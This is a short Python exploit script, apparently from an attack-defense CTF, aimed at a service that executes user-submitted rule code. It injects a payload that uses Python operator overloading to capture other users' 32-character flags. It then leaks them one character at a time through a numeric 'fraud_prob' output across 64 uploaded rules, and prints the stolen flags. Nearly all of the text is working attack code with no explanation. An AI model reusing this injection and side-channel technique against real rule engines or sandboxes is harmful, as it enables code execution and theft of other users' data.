#!/usr/bin/env python3

import sys
from common import call_get_rules_api, call_add_rule_api, call_check_user_api

PREFIX = "SPL2_"

PAYLOAD_START = """
def add(self, flag):
    if len(flag) == 32:
        user["flags"] += [flag]
    return "f" * 32

user["flags"] = []
A = type("A", (), {"__radd__": add, "__add__": add,
                   "__getitem__": lambda *a: "a", "__len__": lambda *a: 42})

user["name"] = user["surname"] = user["registered_at"] = user["favorite_music"] = A()
"""

PAYLOAD_END_TMPL = """
flags = str(user["flags"]) + " "*64
fraud_prob = ord(flags[%d]) - 32
"""

host = sys.argv[1]

start_rule_name = PREFIX + "start"
call_add_rule_api(host, start_rule_name, PAYLOAD_START)

end_rules = []
for i in range(64):
    end_rule_name = PREFIX + "end" + str(i)
    call_add_rule_api(host, end_rule_name, PAYLOAD_END_TMPL % i)
    end_rules.append(end_rule_name)


for rule in call_get_rules_api(host):
    ans = call_check_user_api(host, [start_rule_name, rule] + end_rules, 0)
    if ans is None:
        continue

    flag = "".join(chr(c + 32) for c in ans[2:])
    print(flag)
